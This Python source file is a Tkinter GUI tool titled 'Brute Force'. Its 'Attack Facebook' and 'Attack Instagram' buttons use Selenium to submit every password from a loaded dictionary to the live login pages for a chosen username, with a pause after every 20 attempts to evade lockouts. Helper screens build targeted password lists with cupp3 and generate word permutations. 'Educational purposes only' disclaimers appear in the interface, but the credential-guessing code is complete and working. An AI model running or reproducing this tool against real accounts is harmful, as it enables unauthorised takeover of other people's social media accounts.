from tkinter import *
from tkinter import filedialog
from tkinter.filedialog import *
from tkinter import ttk
import time
import os
import os.path
from selenium import webdriver
import threading
from builtins import float
from datetime import datetime
import getpass
import random
import pyperclip

def random_password_func_for_comp():
	special_symbhols_array=["~", "`", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "-", "_", "+", "=", "\\", "|", "/", ".", "?", "<", ">", ",", "'", '"', "[", "]", "{", "}", ":", ";"]
	lowercase_array=       ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]
	uppercase_array=       ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"]
	numbers_array=         ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
	space_bar_array=       [" "]

	pass_gen_wind=Tk()
	pass_gen_wind.title("Random Password Generator")
	pass_gen_wind.geometry("660x371")
	pass_gen_wind.resizable(0, 0)
	pass_gen_wind.focus_force()
	icon=PhotoImage(file="picks\\random_pass_icon.gif")

	bg=PhotoImage(file="picks\\random_pass_bg.gif")
	pass_gen_wind.tk.call("wm", "iconphoto", pass_gen_wind._w, bg)

	gb_label=Label(pass_gen_wind, image=bg).pack()

	password_length_label=Label(pass_gen_wind, text=" Password Length...........................................................|........................................ |", font=("Times", "15"), bg="white").place(x=10, y=10)
	password_length_entry=Entry(pass_gen_wind, font=("Times", "15"), relief=FLAT, bg="white", fg="#2F2F2F")
	password_length_entry.place(x=450, y=10, height=28)
	password_length_entry.insert(0, "8")

	special_symbhols_label=Label(pass_gen_wind, text=" Special Symbhols (#, %, &, *, ...) ", font=("Times", "15"), bg="white").place(x=10, y=50)
	special_symbhols_var=IntVar()
	special_symbhols_check=Checkbutton(pass_gen_wind, bg="white", onvalue=1, offvalue=0, variable=special_symbhols_var)
	special_symbhols_check.place(x=450, y=50)

	lowercase_label=Label(pass_gen_wind, text=" Lowercase (a, b, c, ... z) ", font=("Times", "15"), bg="white").place(x=10, y=90)
	lowercase_var=IntVar()
	lowercase_check=Checkbutton(pass_gen_wind, bg="white", onvalue=1, offvalue=0, variable=lowercase_var)
	lowercase_check.place(x=450, y=90)

	uppercase_label=Label(pass_gen_wind, text=" Uppercase (A, B, C, ... Z) ", font=("Times", "15"), bg="white").place(x=10, y=130)
	uppercase_var=IntVar()
	uppercase_check=Checkbutton(pass_gen_wind, bg="white", onvalue=1, offvalue=0, variable=uppercase_var)
	uppercase_check.place(x=450, y=130)

	numbers_label=Label(pass_gen_wind, text=" Numbers (0, 1, 2, ... 9) ", font=("Times", "15"), bg="white").place(x=10, y=170)
	numbers_var=IntVar()
	numbers_check=Checkbutton(pass_gen_wind, bg="white", onvalue=1, offvalue=0, variable=numbers_var)
	numbers_check.place(x=450, y=170)

	space_bar_label=Label(pass_gen_wind, text=" Space ", font=("Times", "15"), bg="white").place(x=10, y=210)
	space_bar_var=IntVar()
	space_bar_check=Checkbutton(pass_gen_wind, bg="white", onvalue=1, offvalue=0, variable=space_bar_var)
	space_bar_check.place(x=450, y=210)

	exception_label=Label(pass_gen_wind, text="Exceptions |", font=("Times", "15"), bg="white").place(x=10, y=250)

	exception_entry=Entry(pass_gen_wind, font=("Times", "15"), relief=FLAT, bg="white", fg="#2F2F2F")
	exception_entry.place(x=110, y=250, height=28)

	exception_exaple_label=Label(pass_gen_wind, text="| Examples (Acr7.< -E) ", font=("Times", "15"), bg="white").place(x=314, y=250)


	generated_password_entry=Entry(pass_gen_wind, font=("Times", "15"))
	generated_password_entry.insert(0, "Generated Password")
	generated_password_entry.configure(state="disabled")
	generated_password_entry.place(x=10, y=280, height=41, width=640)

	def copy_password():
		generated_password_entry.configure(state="normal")
		pyperclip.copy(generated_password_entry.get())
		generated_password_entry.configure(state="disabled")
	copy_button=Button(pass_gen_wind, text="  Copy  ", font=("Times", "15"), bg="white", relief=GROOVE, command=copy_password)
	copy_button.place(x=574, y=330)

	def back_menu():
		pass_gen_wind.destroy()
		menu()
	back_to_manu_button=Button(pass_gen_wind, text="Back to Main Menu", bg="white", relief=GROOVE, command=back_menu)
	back_to_manu_button.place(x=10, y=330)
	def generate_click():
		threading.Thread(target=generate).start()
	def generate():
		symbhols_array=[]
		if special_symbhols_var.get()==1:
			symbhols_array+=special_symbhols_array
		if lowercase_var.get()==1:
			symbhols_array+=lowercase_array
		if uppercase_var.get()==1:
			symbhols_array+=uppercase_array
		if numbers_var.get()==1:
			symbhols_array+=numbers_array
		if space_bar_var.get()==1:
			symbhols_array+=space_bar_array
		exc=list(exception_entry.get())
		for i in range(len(exc)):
			if exc[i] in symbhols_array:
				del  symbhols_array[symbhols_array.index(exc[i])]
		password=""
		try:
			for x in range( int( password_length_entry.get() ) ):
				password+=symbhols_array[random.randint(0, len(symbhols_array)-1)]
			generated_password_entry.configure(state="normal")
			generated_password_entry.delete(0, END)
			generated_password_entry.insert(0, password)
			generated_password_entry.configure(state="disabled")
		except:
			generated_password_entry.configure(state="normal")
			generated_password_entry.delete(0, END)
			generated_password_entry.insert(0, "Please Check Your Input")
			generated_password_entry.configure(state="disabled")

	generate_button=Button(pass_gen_wind, text="Generate", font=("Times", "15"), bg="white", relief=GROOVE, command=generate_click)
	generate_button.place(x=550, y=130)

	pass_gen_wind.mainloop()
###############################################################################################################################################
###############################################################################################################################################
def attack(site, site_link):
	root=Tk()
	root.geometry("854x480")
	icon = PhotoImage(file="picks\\icon.gif")
	root.tk.call('wm', 'iconphoto', root._w, icon)
	if site=="fb":
		root.title("Facebook Brute Force")
	elif site=="inst":
		root.title("Instagram Brute Force")
	root.resizable(0, 0)
	root.focus_force()

	bg = PhotoImage(file='picks\\hack.gif')
	bg_label=Label(root, image=bg)
	bg_label.place(x=0, y=0)


	def timer():
		global minute, second, i, dot, temp
		minute = ( interval_entry.get().split(":") )[0] 
		second = ( interval_entry.get().split(":") )[1] 
		timer_label=Label(root, text="Please Wait "+interval_entry.get(), font=("Times", "17"), anchor="w")
		timer_label.place(x=5, y=220, width=200)
		dot=0
		temp = int(minute) * 60 + int(second)
		def tick():
			global minute, second, i, dot, temp
			new_time = datetime.utcfromtimestamp(temp).strftime("%M:%S")
			timer_label.configure(text="Please Wait " + str(new_time) + " " + "." * dot) 
			dot += 1
			if dot > 3:
				dot = 0
			temp -= 1
			if temp == -1:
				timer_label.place_forget()
				return
			root.after(1000, tick)
		tick()

	global this_time
	this_time=0
	def global_timer():
		global this_time
		global_timer_label["text"]=str(datetime.utcfromtimestamp(this_time).strftime("%H:%M:%S"))
		this_time+=1
		timer=root.after(1000, global_timer)

	def open_dict_button_click():
		threading.Thread(target=open_dict).start()

	def open_dict():
		global passwords
		passwords=[0]
		file_name = filedialog.askopenfilename(filetypes=(("Text Files","*.txt"),("Text Files","*.txt")))
		file=open(file_name, "r")
		for line in file:
		    passwords.append(line.rstrip())
		file_directory_entry=Entry(root, font=("Times", "17"), relief=GROOVE, bg="#F0F0F0", fg="black")
		file_directory_entry.insert(0, file_name)
		file_directory_entry.configure(state="disable")
		file_directory_entry.place(x=350, y=123, height=35, width=400)
		progress["maximum"]=len(passwords)-1

	def start_brute_force_click():
		global passwords
		try:
			if len(passwords)>1:
				threading.Thread(target=start_brute_force).start()
		except:
			pass

	def start_brute_force():
		global_timer()

		os.system(r"If Not Exist \"C:\\Users\\Win10\\AppData\\Local\\chromedriver"+
				"."+
				"exe\" ( If Exist \"C:\\Users\\"+
				getpass.getuser()+
				"\\AppData\\Local\" (copy chromedriver.exe \"C:\\Users\\"+
				getpass.getuser()+
				"\\AppData\\Local\\chromedriver.exe\") Else (mkdir \"C:\\Users\\"+
				getpass.getuser()+
				"\\AppData\\Local\") )")

		os.system(r"If Not Exist \"C:\\Users\\Win10\\AppData\\Local\\geckodriver"+
			"."+
			"exe\" ( If Exist \"C:\\Users\\"+
			getpass.getuser()+
			"\\AppData\\Local\" (copy geckodriver.exe \"C:\\Users\\"+
			getpass.getuser()+
			"\\AppData\\Local\\geckodriver.exe\") Else (mkdir \"C:\\Users\\"+
			getpass.getuser()+
			"\\AppData\\Local\") )")
		
		os.system(r"PATH %PATH%; C:\\Users\\"+getpass.getuser()+"\\AppData\\Local\\chromedriver"+"."+"exe")
		os.system(r"PATH %PATH%; C:\\Users\\"+getpass.getuser()+"\\AppData\\Local\\geckodriver"+"."+"exe")
		
		try:
			try:
				try:
					driver = webdriver.Chrome("C:\\Users\\"+getpass.getuser()+"\\AppData\\Local\\chromedriver.exe")
				except:
					driver = webdriver.Firefox(os.path.dirname(os.path.realpath(__file__))+"\\chromedriver.exe")
			except:
				driver = webdriver.Chrome(None)

		except:
			try:
				try:
					driver = webdriver.Firefox("C:\\Users\\"+getpass.getuser()+"\\AppData\\Local\\geckodriver.exe")
				except:
					driver = webdriver.Firefox(os.path.dirname(os.path.realpath(__file__))+"\\geckodriver.exe")
			except:
				driver = webdriver.Firefox(None)
		driver.get(site_link)

		global passwords
		for i in range(1, len(passwords)):
			try:
				bottom_text_widget["state"]="normal"
				bottom_text_widget.delete(1.0, END)
				bottom_text_widget.insert(1.0, "Trying password [ " + passwords[i] + " ]...\nNumber of tested passwords " + str(i) + " / " + str(len(passwords)-1))
				bottom_text_widget["state"]="disable"
				if site=="inst":
					username=driver.find_element_by_name("username").clear()
					driver.find_element_by_name("username").send_keys( Login_or_ID_entry.get() )
					password=driver.find_element_by_name("password").clear()
					driver.find_element_by_name("password").send_keys(passwords[i])
					driver.find_element_by_tag_name("button").click()
					time.sleep(0.8)
				elif site=="fb":
					email=driver.find_element_by_id("email").clear()
					driver.find_element_by_id("email").send_keys( Login_or_ID_entry.get() )
					password=driver.find_element_by_id("pass").clear()
					driver.find_element_by_id("pass").send_keys(passwords[i])
					driver.find_element_by_id("loginbutton").click()

			except:
				root.after_cancel(timer)
				bottom_text_widget["state"]="normal"
				bottom_text_widget.delete(1.0, END)
				this_time_str = str(datetime.utcfromtimestamp(this_time).strftime("%H:%M:%S"))
				bottom_text_widget.insert(1.0, "Password : "+passwords[i-1]+"\nNumber of tested passwords : "+str(i-1)+"\nTime : "+str(this_time_str)+" (H, M, S)")
				bottom_text_widget["state"]="disable"
				return
			if i%20==0:
				temp=int( (interval_entry.get().split(":") )[0] ) *60 + int( (interval_entry.get().split(":") )[1])
				timer()
				time.sleep(temp)
			progress["value"]=i
			persent_label["text"]=str( round( float( (i*100)/int(progress["maximum"]) ), 1 ) )+"%"

		bottom_text_widget["state"]="normal"
		bottom_text_widget.delete(1.0, END)
		this_time_str = str(datetime.utcfromtimestamp(this_time).strftime("%H:%M:%S"))
		bottom_text_widget.insert(1.0, "Password not found ;(\nTime : "+this_time_str+" (H, M, S)")
		bottom_text_widget["state"]="disable"


	Login_or_ID_label=Label(root, text="Login or ID", bg="#F0F0F0", font=("Times", "20")).place(x=5, y=5, width=150)
	Login_or_ID_entry=Entry(root, font=("Times", "18"), relief=FLAT, bg="#F0F0F0")
	Login_or_ID_entry.place(x=5, y=40, width=844, height=40)

	interval_label=Label(root, text="Wait after 20 wrong passwords (minutes:seconds)", font=("Times", "11")).place(x=5, y=100)
	interval_entry=Entry(root, font=("Times", "17"), relief=GROOVE, bg="#F0F0F0")
	interval_entry.place(x=5, y=123, height=35)
	interval_entry.insert(0, "20:00")

	browse_file_button=Button(root, text="Browse Dictionary", font=("Times", "10"), relief=GROOVE, command=open_dict_button_click).place(x=350, y=100)

	start_button=Button(root, text="START", font=("Times", "17"), relief="groove", command=start_brute_force_click).place(x=750, y=200)

	progress=ttk.Progressbar(root, value=0)
	progress.place(x=5, y=255, width=760, height=40)

	persent_label=Label(root, text="0.0%", anchor="e", font=("Times", "17"))
	persent_label.place(x=775, y=255, height=40, width=75)

	global_timer_label=Label(root, text="00:00:00", font=("Times", "15"), bg="#F0F0F0")
	global_timer_label.place(x=770, y=5)

	file_directory_entry=Entry(root, font=("Times", "17"), relief=GROOVE, bg="#F0F0F0", fg="black")
	file_directory_entry.configure(state="disable")
	file_directory_entry.place(x=350, y=123, height=35, width=400)

	bottom_text_widget=Text(root, font=("Times", "17"), relief="groove", bg="#F0F0F0")
	bottom_text_widget.insert(1.0, '''#This program is for educational purposes only.
#Don't attack ''' + ('''instagram''' if site=="inst" else '''facebook''') + ''' people accounts. It's illegal !
#If you want to crack into someone's account, you must have the permission of the user.''')
	bottom_text_widget.configure(state="disable")
	bottom_text_widget.place(x=5, y=300, height=140, width=844)

	def back_menu():
		root.destroy()
		menu()
	back_button=Button(root, text="Back Main Menu", font=("Times", "12"), relief=GROOVE, command=back_menu).place(x=5, y=443)

	root.mainloop()



def possible_combinations_func_for_comp():
	combinations_wind=Tk()
	combinations_wind.resizable(0, 0)
	combinations_wind.title("Word Combinations")
	icon=PhotoImage(file="picks\\factorial_icon.gif")
	combinations_wind.tk.call("wm", "iconphoto", combinations_wind._w, icon)
	bg=PhotoImage(file="picks\comb_bg.gif")
	bg_label=Label(combinations_wind, image=bg).pack()
	combinations_wind.focus_force()

	def symbhol_in_one_string(char, array): # char="m", array=["e", "n", "u"]
		returned_array=[]
		for i in range(len(array)+1):
			string=""
			array.insert(i, char)#["m", "e", "n", "u"]
			for x in range(len(array)):
				string+=array[x]#"menu"
			returned_array.append(string)#["menu"]
			array.remove(array[i])#["e", "n", "u"]
		return returned_array

	def symbhol_in_many_strings(char, array): # char="m", array=["en", "ne"]
		returned_array=[]
		for i in range(len(array)):
			returned_array.extend(symbhol_in_one_string(char, list(array[i])))
		return returned_array

	def last_two_chars(string):# menu
		return [string, string[::-1]] #["nu", "un"]

	def all_combinations(string): #1) m(enu) 2) e(nu)  [nu, un]
		if len(string)==2:
			return last_two_chars(string)
		else:
			return symbhol_in_many_strings(string[0], all_combinations(string[1:]))

	def choose_dir():
		directory=askdirectory().replace("/", "\\")
		directory_entry.configure(state="normal")
		directory_entry.delete(0, END)
		directory_entry.insert(0, directory)
		directory_entry.configure(state="disabled")
	def back_menu():
		combinations_wind.destroy()
		menu()
	def start_generate():
		threading.Thread(target=generate).start()
	def generate():
		test=0
		file_name_label["text"]="Compose The FileName"
		word_label["text"]="Word"
		directory_label["text"]="Directory of saved file"
		if ("\\" in file_name_entry.get() or
			"/" in file_name_entry.get() or
			"\"" in file_name_entry.get() or
			"*" in file_name_entry.get() or
			"?" in file_name_entry.get() or
			":" in file_name_entry.get() or
			"<" in file_name_entry.get() or
			">" in file_name_entry.get() or
			"|"in file_name_entry.get()):
			file_name_label["text"]="Compose The FileName without using \ / \" * ? : < > |"
			test=1
		if (file_name_entry.get()==""):
			file_name_label["text"]="Compose The FileName *"
			test=1
		if (word_entry.get()==""):
			word_label["text"]="Word *"
			test=1
		directory_entry.configure(state="normal")
		if (directory_entry.get()==""):
			directory_label["text"]="Directory of saved file *"
			test=1
		directory_entry.configure(state="disabled")
		if (test==0):
			file_name_label["text"]="Compose The FileName"
			word_label["text"]="Word"
			directory_label["text"]="Directory of saved file"

			dir_name=directory_entry.get()
			word_label["text"]="Wait..."
			combinations_array=list( set( all_combinations(word_entry.get()) ) )
			os.system("echo > \""+dir_name+"\\"+file_name_entry.get()+".txt\"")
			file_dir=dir_name+"\\"+file_name_entry.get()+".txt"

			file=open(file_dir, "w")

			for i in range(len(combinations_array)):
				file.write(combinations_array[i]+"\n")
			word_label["text"]="|  "+str(len(combinations_array))+" Combinations  |" 
			file.close()

	word_label=Label(combinations_wind, text="Word", font=("Times", "15"), bg="#F0F0F0")
	word_label.place(x=4, y=0)
	word_entry=Entry(combinations_wind, font=("Times", "12"), relief=FLAT, bg="#F0F0F0")
	word_entry.place(x=4, y=27, height=30, width=320)

	directory_label=Label(combinations_wind, text="Directory of saved file", font=("Times", "15"), bg="#F0F0F0")
	directory_label.place(x=4, y=59)
	directory_entry=Entry(combinations_wind, state="disabled", font=("Times", "12"), relief=FLAT, bg="#F0F0F0")
	directory_entry.place(x=4, y=86, height=30, width=320)
	browse_button=Button(combinations_wind, text="|   Browse", font=("Times", "12"), relief=FLAT, bg="#F0F0F0", command=choose_dir).place(x=324, y=86, width=80, height=30)

	file_name_label=Label(combinations_wind, text="Compose The FileName", font=("Times", "15"), bg="#F0F0F0")
	file_name_label.place(x=4, y=118)
	file_name_entry=Entry(combinations_wind, font=("Times", "12"), relief=FLAT, bg="#F0F0F0")
	file_name_entry.insert(0, "file")
	file_name_entry.place(x=4, y=145, height=30, width=320)

	generate_button=Button(combinations_wind, text="| Generate |", font=("Times", "12"), relief=FLAT, bg="#F0F0F0", command=start_generate).place(x=370, y=267, width=80, height=30)

	back_menu_button=Button(combinations_wind, text="Back to main menu", font=("Times", "12"), relief=FLAT, bg="#F0F0F0", command=back_menu).place(x=10, y=267, height=30)

	combinations_wind.mainloop()


def menu():
	main_menu=Tk()
	main_menu.geometry("500x500")
	main_menu.title("Brute Force")
	main_menu.resizable(0, 0)
	icon=PhotoImage(file="picks\\icon.gif")
	bg=PhotoImage(file="picks\\menu_bg.gif")
	main_menu.tk.call("wm", "iconphoto", main_menu._w, icon)
	bg_label=Label(main_menu, image=bg).place(x=-1, y=0)
	main_menu.focus_force()

	def cupp_master_click():
		main_menu.destroy()
		pass_list_generator=Tk()
		pass_list_generator.geometry("500x300")
		pass_list_generator.title("Password List Generator")
		pass_list_generator.resizable(0, 0)
		icon=PhotoImage(file="picks\pass_list_icon.gif")
		pass_list_generator.tk.call("wm", "iconphoto", pass_list_generator._w, icon)
		pass_list_generator.focus_force()
		bg=PhotoImage(file="picks\cupp_master_bg.gif")

		bg_label=Label(pass_list_generator, image=bg).place(x=-1, y=-1)

		def browse():
			directory = askdirectory().replace("/", "\\")
			choose_file_directory_entry["state"]="normal"
			choose_file_directory_entry.delete(0, END)
			choose_file_directory_entry.insert(0, directory)
			choose_file_directory_entry["state"]="disabled"
		def cupp_master():
			os.system("\"password list generator.bat\"")
		def start():
			os.system("echo >\"password list generator.txt\"")
			file=open("password list generator.txt", "w")
			file.write("cd gen\ncls\ncupp3.exe -i\ncd ..\nmove gen\*.txt \""+choose_file_directory_entry.get()+"\pass.txt\"")
			file.close()
			os.system("move \"password list generator.txt\" \"password list generator.bat\"")
			threading.Thread(target=cupp_master).start()

		choose_file_directory_label=Label(pass_list_generator, text="Choose File Directory", font=("Times", "20"), bg="white").pack()

		choose_file_directory_entry=Entry(pass_list_generator, font=("Times", "15"), state="disabled")
		choose_file_directory_entry.place(x=10, y=150, height=40, width=370)

		browse_file_button=Button(pass_list_generator, text="Browse", font=("Times", "15"), relief=GROOVE, command=browse)
		browse_file_button.place(x=370, y=150, height=40)

		create_button=Button(pass_list_generator, text="Create", font=("Times", "15"), relief=GROOVE, command=start)
		create_button.place(x=200, y=220, height=50, width=100)


		def back_menu():
			pass_list_generator.destroy()
			menu()
		back_button=Button(pass_list_generator, text="Back Main Menu", font=("Times", "12"), relief=GROOVE, command=back_menu).place(x=5, y=260)


		pass_list_generator.mainloop()	


	def random_password():
		main_menu.destroy()
		random_password_func_for_comp()

	def open_facebook_part():
		main_menu.destroy()
		attack(site="fb", site_link="https://www.facebook.com/login.php?login_attempt=1&lwv=111")

	def open_instagram_part():
		main_menu.destroy()
		attack(site="inst", site_link="https://www.instagram.com/accounts/login/")
	def possible_combinations_part():
		main_menu.destroy()
		possible_combinations_func_for_comp()

	fb_button=Button(main_menu, text="Attack Facebook", font=("Times", "17"), relief=FLAT, command=open_facebook_part).place(x=10, y=100, width=190, height=45)
	
	inst_button=Button(main_menu, text="Attack Instagram", font=("Times", "17"), relief=FLAT, command=open_instagram_part).place(x=290, y=100, width=190, height=45)
	
	cupp_master_button=Button(main_menu, text="Create Password List", font=("Times", "13"), relief=FLAT, command=cupp_master_click).place(x=290, y=180, width=190, height=45)
	
	random_password_generator_button=Button(main_menu, text="Generate random Password", font=("Times", "13"), relief=FLAT, command=random_password).place(x=10, y=180, width=190, height=45)

	possible_combinations_button=Button(main_menu, text="Possible Combinations of Word Symbhols", font=("Times", "15"), relief=FLAT, command=possible_combinations_part).place(x=80, y=240, width=350, height=45)

	
	info_label=Label(main_menu, text="#Don't attack people accounts. It's illegal !", font=("Times", "15")).place(x=55, y=310, width=390)

	main_menu.mainloop()

menu()